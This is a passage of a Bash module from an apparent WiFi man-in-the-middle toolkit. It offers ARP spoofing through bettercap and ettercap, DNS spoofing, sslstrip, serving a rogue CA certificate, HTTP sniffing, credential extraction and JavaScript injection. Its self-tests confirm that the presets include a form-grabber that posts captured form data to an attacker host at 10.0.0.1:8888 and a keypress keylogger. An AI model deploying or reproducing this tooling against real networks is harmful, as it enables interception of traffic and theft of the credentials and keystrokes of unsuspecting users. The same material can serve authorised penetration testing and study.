    printf 'macOS: double-click, add to System, then Trust > Always Trust\n'
    printf 'Firefox: Preferences > Privacy > Certificates > View > Authorities > Import\n'
}

arp_ca_start_server() {
    local port="${1:-8888}"
    mkdir -p "$ARP_CA_DIR"
    pkill -f "http.server $port" 2>/dev/null
    ( cd "$ARP_CA_DIR" && nohup python3 -m http.server "$port" \
        --bind 0.0.0.0 > "$LOGS_DIR/ca_server.log" 2>&1 & \
      echo $! > "$ARP_STATE_DIR/ca_server.pid" )
    sleep 1
    printf 'SERVER\t%s\t%s\n' "$port" "$(cat "$ARP_STATE_DIR/ca_server.pid")"
}

arp_ca_stop_server() {
    local killed=0 pid=""
    [[ -f "$ARP_STATE_DIR/ca_server.pid" ]] && \
        pid=$(cat "$ARP_STATE_DIR/ca_server.pid")
    if [[ -n "$pid" ]]; then
        stop_kill_pid "$pid" && killed=1
    fi
    stop_sweep "http.server 8888" && killed=1
    if (( killed == 1 )) || [[ -z "$pid" ]]; then
        rm -f "$ARP_STATE_DIR/ca_server.pid"
        printf 'STOPPED\n'
        return 0
    fi
    printf 'ERROR\tCA server pid %s survived SIGKILL (pidfile kept)\n' "$pid" >&2
    return 1
}

# ── HTTP stream / detail / posts / cookies / hosts ──

HTTP_PID_FILE="$ARP_STATE_DIR/httpstream.pid"

arp_cli_http_stream() {
    local iface="$1"
    [[ -z "$iface" ]] && { printf 'missing iface\n' >&2; return 2; }
    command -v tshark >/dev/null || { printf 'tshark missing\n' >&2; return 1; }

    echo $$ > "$HTTP_PID_FILE"
    exec stdbuf -oL tshark -i "$iface" -I -n -l \
        -Y 'http.request or http.response or tls.handshake.type == 1' \
        -T fields -E 'separator=\t' -E 'occurrence=f' \
        -e frame.number -e frame.time_epoch \
        -e ip.src -e ip.dst \
        -e http.request.method -e http.request.uri -e http.host -e http.user_agent \
        -e http.response.code -e http.content_type -e http.content_length \
        -e tls.handshake.extensions_server_name \
        2>/dev/null
}

arp_cli_http_stop() {
    if [[ -s "$HTTP_PID_FILE" ]]; then
        local pid; pid=$(<"$HTTP_PID_FILE")
        if stop_kill_pid "$pid"; then
            rm -f "$HTTP_PID_FILE"
            printf 'STOPPED\n'
            return 0
        fi
        printf 'ERROR\thttp pid %s survived SIGKILL (pidfile kept)\n' "$pid" >&2
        return 1
    fi
    printf 'ERR\tno pid\n'
    return 1
}

arp_cli_http_status() {
    if [[ -s "$HTTP_PID_FILE" ]]; then
        local pid; pid=$(<"$HTTP_PID_FILE")
        if kill -0 "$pid" 2>/dev/null; then
            printf 'running\t1\npid\t%s\n' "$pid"; return
        fi
    fi
    printf 'running\t0\npid\t\n'
}

# ── verified stop ──
# Escalating signals; returns 0 ONLY once the pid is actually gone. Signals
# the process group first so forked children die with the leader. Stops that
# print STOPPED and delete the pidfile without this can strand a capture with
# no remaining handle to it, making the stop button useless.
stop_kill_pid() {
    local pid="$1" i
    # Liveness via /proc, NOT `kill -0`: for a root-owned process we get EPERM,
    # and treating that as "gone" made stops report success while nothing died.
    [[ -d "/proc/$pid" ]] || return 0
    kill -INT  "-$pid" 2>/dev/null || kill -INT  "$pid" 2>/dev/null
    for i in 1 2 3 4 5 6 7 8 9 10; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -TERM "-$pid" 2>/dev/null || kill -TERM "$pid" 2>/dev/null
    for i in 1 2 3 4 5; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -KILL "-$pid" 2>/dev/null || kill -KILL "$pid" 2>/dev/null
    sleep 0.3
    [[ -d "/proc/$pid" ]] && return 1
    return 0
}
# Kill everything matching a pgrep -f pattern, never this shell or its parent.
# Returns non-zero only if something matched and SURVIVED.
stop_sweep() {
    local pat="$1" sp rs=0 any=0
    # Exclude this process AND its whole ancestor chain. Excluding only $$ and
    # $PPID is not enough: when invoked via `timeout` or pkexec the caller's
    # shell is further up, and a cmdline substring match would kill it — a
    # pattern like "mitm6" matches the very command line running this stop.
    local -A _skip=()
    sp=$$
    while [[ -n "$sp" && "$sp" != "0" && "$sp" != "1" ]]; do
        _skip[$sp]=1
        sp=$(ps -o ppid= -p "$sp" 2>/dev/null | tr -d ' ')
        [[ -z "$sp" ]] && break
    done
    for sp in $(pgrep -f "$pat" 2>/dev/null); do
        [[ -n "${_skip[$sp]:-}" ]] && continue
        any=1
        stop_kill_pid "$sp" || rs=1
    done
    (( any )) && return $rs
    return 0
}

# ── self-test ────────────────────────────────────────────────────────────
# Offline only: no root, no iface, no bettercap, no live traffic. The rule
# store, the inject presets and the caplet generator are all redirected to
# a scratch caplet dir under $TMP_DIR, so the operator's real caplets and
# the real loot tree are never touched.
arp_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }
    afld() { awk -F'\t' -v k="$1" '$1==k {print $2; exit}'; }

    command -v python3 >/dev/null 2>&1 || {
        printf 'selftest-env\tFAIL python3 missing (needed by the escapers)\n'
        printf 'RESULT\tFAIL(1)\n'; return 1; }

    local MOD_TMP="$TMP_DIR/arp_selftest"
    rm -rf "$MOD_TMP"; mkdir -p "$MOD_TMP/caplets"
    local save_cap="$ARP_CAPLET_DIR"
    ARP_CAPLET_DIR="$MOD_TMP/caplets"

    # ── JS string escaping ──
    chk js-escape-quote "$(arp_js_escape 'a"b')" 'a\"b'
    chk js-escape-backslash "$(arp_js_escape 'a\b')" 'a\\b'
    chk js-escape-tab "$(arp_js_escape "$(printf 'a\tb')")" 'a\tb'
    chk js-escape-newline "$(arp_js_escape "$(printf 'a\nb')")" 'a\nb'
    chk js-escape-nonascii "$(arp_js_escape 'cafe…')" 'cafe\u2026'
    chk js-escape-empty "$(arp_js_escape '')" ''
    # The escape must actually neutralise a string that would otherwise end
    # the JS literal early.
    chk js-escape-quotes-only "$(arp_js_escape '");alert(1);//')" '\");alert(1);//'

    # ── sed replacement escaping, proved by a real sed round-trip ──
    local raw='10.0.0.1|a&b/c[d](e)*f+g?h^i$j{k}'
    local esc
    esc=$(arp_sed_escape "$raw")
    chk sed-escape-roundtrip "$(printf 'X' | sed "s|X|$esc|")" "$raw"
    # Without escaping the metacharacters would corrupt the output.
    chk sed-escape-is-not-identity "$([[ "$esc" != "$raw" ]] && echo escaped || echo raw)" "escaped"

    # ── rule store round trip ──
    arp_rules_add redirect 'http://evil.example' '/blocked' >/dev/null
    chk rules-add-rc "$?" "0"
    arp_rules_add header-req 'User-Agent' 'x"y' >/dev/null
    arp_rules_add header-resp 'X-Test' 'a\b' >/dev/null
    local rl
    rl=$(arp_rules_list)
    chk rules-count "$(grep -c . <<<"$rl")" "3"
    chk rules-row1 "$(sed -n 1p <<<"$rl")" "$(printf '1\tredirect\thttp://evil.example\t/blocked\t')"
    chk rules-row2 "$(sed -n 2p <<<"$rl")" "$(printf '2\theader-req\tUser-Agent\tx"y\t')"
    chk rules-row3 "$(sed -n 3p <<<"$rl")" "$(printf '3\theader-resp\tX-Test\ta\\b\t')"

    # Unknown kinds and missing arguments must be refused, and nothing written.
    local rc=0
    arp_rules_add bogus x >/dev/null 2>&1 || rc=$?
    chk rules-unknown-kind-rc "$rc" "2"
    rc=0; arp_rules_add redirect >/dev/null 2>&1 || rc=$?
    chk rules-missing-arg-rc "$rc" "2"
    chk rules-rejects-not-stored "$(arp_rules_list | grep -c .)" "3"

    # Deleting one rule must not renumber or lose the others.
    arp_rules_del 2 >/dev/null
    rl=$(arp_rules_list)
    chk rules-del-count "$(grep -c . <<<"$rl")" "2"
    chk rules-del-renumbered "$(sed -n 2p <<<"$rl" | cut -f2)" "header-resp"
    chk rules-del-kept-first "$(sed -n 1p <<<"$rl" | cut -f3)" "http://evil.example"

    # ── caplet generation uses the safe escapers ──
    printf 'console.log("hi");\n' > "$ARP_CAPLET_DIR/inject.js"
    local bl
    bl=$(arp_caplet_build wlan0 '192.168.1.0/24')
    chk caplet-rc "$?" "0"
    chk caplet-js-path "$(afld JS <<<"$bl")" "$ARP_CAPLET_DIR/generated.js"
    chk caplet-cap-path "$(afld CAPLET <<<"$bl")" "$ARP_CAPLET_DIR/merged.cap"
    local gj="$ARP_CAPLET_DIR/generated.js"
    chk caplet-redirect-line "$(grep -cF '__redirects.push([/http://evil.example/, "/blocked"]);' "$gj")" "1"
    # b held a raw backslash: it must reach the JS as an escaped one.
    chk caplet-backslash-line "$(grep -cF '__hdr_resp.push(["X-Test", "a\\b"]);' "$gj")" "1"
    # The deleted header-req rule must not reappear.
    chk caplet-deleted-rule-gone "$(grep -cF '__hdr_req.push(' "$gj")" "0"
    chk caplet-user-injection "$(grep -cF 'console.log("hi");' "$gj")" "1"
    chk caplet-headers-emitted "$(grep -cE '^var __(redirects|hdr_req|hdr_resp) = \[\];$' "$gj")" "3"

    local cap="$ARP_CAPLET_DIR/merged.cap"
    chk caplet-proxy-script "$(grep -cF "set http.proxy.script $gj" "$cap")" "1"
    chk caplet-sslstrip "$(grep -cF 'set http.proxy.sslstrip true' "$cap")" "1"
    chk caplet-targets "$(grep -cF 'set arp.spoof.targets 192.168.1.0/24' "$cap")" "1"
    chk caplet-enables "$(grep -cF 'arp.spoof on' "$cap")" "1"
    # No target means no target line, rather than an empty one.
    arp_caplet_build wlan0 '' >/dev/null
    chk caplet-no-target-line "$(grep -c 'arp.spoof.targets' "$cap")" "0"

    arp_rules_clear >/dev/null
    chk rules-clear "$(arp_rules_list | grep -c .)" "0"
    chk rules-file-emptied "$(wc -c < "$ARP_CAPLET_DIR/rules.tsv")" "0"

    # ── inject script save / show / clear round trip ──
    local sv sline
    sv=$(printf 'x' | arp_inject_save)
    sline=$(grep '^SAVED' <<<"$sv")
    chk inject-save-path "$(cut -f2 <<<"$sline")" "$ARP_CAPLET_DIR/inject.js"
    chk inject-save-bytes "$(cut -f3 <<<"$sline")" "1"
    chk inject-show-roundtrip "$(arp_inject_show)" "x"
    arp_inject_clear >/dev/null
    chk inject-clear "$(arp_inject_show)" ""

    # ── inject presets ──
    chk presets-count "$(arp_inject_presets | grep -c .)" "10"
    chk presets-has-form-grabber "$(arp_inject_presets | cut -f1 | grep -c '^form-grabber$')" "1"
    chk preset-form-grabber "$(arp_inject_preset_get form-grabber | grep -cF 'fetch("http://10.0.0.1:8888/post"')" "1"
    chk preset-keylogger "$(arp_inject_preset_get keylogger | grep -cF 'addEventListener("keypress"' )" "1"
    chk preset-none "$(arp_inject_preset_get none)" "// empty"
    rc=0; arp_inject_preset_get not-a-preset >/dev/null 2>&1 || rc=$?
    chk preset-unknown-rc "$rc" "1"

    # ── verified stop ──
    # A pid that does not exist is already stopped: 0, without signalling.
    chk stop-kill-missing-pid "$(stop_kill_pid 999999; echo $?)" "0"

    rc=0; arp_cli_main --no-such-flag >/dev/null 2>&1 || rc=$?
    chk unknown-command-rc "$rc" "2"

    ARP_CAPLET_DIR="$save_cap"
    rm -rf "$MOD_TMP"

    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

arp_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --list-ifaces-tsv)         arp_cli_list_ifaces_tsv ;;
        --status-tsv)              arp_cli_status_tsv ;;
        --set-iface)               arp_cli_set_iface "$@" ;;
        --scan-hosts)              arp_cli_scan_hosts ;;
        --list-hosts-tsv)          arp_cli_list_hosts_tsv ;;
        --set-target)              arp_cli_set_target "$@" ;;
        --start-mitm-bettercap)    arp_cli_start_mitm_bettercap ;;
        --start-mitm-ettercap)     arp_cli_start_mitm_ettercap ;;
        --dns-spoof)               arp_cli_dns_spoof "$@" ;;
        --sniff)                   arp_cli_sniff "$@" ;;
        --extract-creds)           arp_cli_extract_creds "$@" ;;
        --http-stream)             arp_cli_http_stream "$@" ;;
        --http-stop)               arp_cli_http_stop ;;
        --http-status-tsv)         arp_cli_http_status ;;
        --stop)                    arp_cli_stop ;;
        --ca-status)               arp_ca_status ;;
        --ca-generate)             arp_ca_generate "$@" ;;
        --ca-instructions)         arp_ca_serve_info ;;
        --ca-server-start)         arp_ca_start_server "$@" ;;
        --ca-server-stop)          arp_ca_stop_server ;;
        --rules-list)              arp_rules_list ;;
        --rules-add)               arp_rules_add "$@" ;;
        --rules-del)               arp_rules_del "$@" ;;
        --rules-clear)             arp_rules_clear ;;
        --inject-show)             arp_inject_show ;;
        --inject-save)             arp_inject_save ;;
        --inject-clear)            arp_inject_clear ;;
        --inject-presets)          arp_inject_presets ;;
        --inject-preset-get)       shift; arp_inject_preset_get "$@" ;;
        --caplet-build)            arp_caplet_build "$@" ;;
        --caplet-show)             arp_caplet_show ;;
        --caplet-restart)          arp_caplet_restart "$@" ;;
        --selftest)                arp_selftest ;;
        *)
            cat >&2 <<EOF
Usage: $0 COMMAND [args...]
  --list-ifaces-tsv | --status-tsv | --set-iface IFACE
  --scan-hosts | --list-hosts-tsv | --set-target IP
  --start-mitm-bettercap | --start-mitm-ettercap
  --dns-spoof DOMAIN [REDIR] | --sniff [DUR] | --extract-creds [PCAP]
  --stop
  --ca-status | --ca-generate [CN] | --ca-instructions
  --ca-server-start [PORT] | --ca-server-stop
  --rules-list | --rules-add KIND A [B] | --rules-del N | --rules-clear
  --inject-show | --inject-save | --inject-clear | --inject-presets
  --inject-preset-get NAME
  --caplet-build [IFACE] [TARGET] | --caplet-show | --caplet-restart IFACE [TARGET]
  --http-stream IFACE | --http-stop | --http-status-tsv
  --selftest                  offline assertions, no hardware
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    WIFISTING_CLI=1
    command -v banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    command -v warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    command -v err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    command -v ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    arp_cli_main "$@"
fi
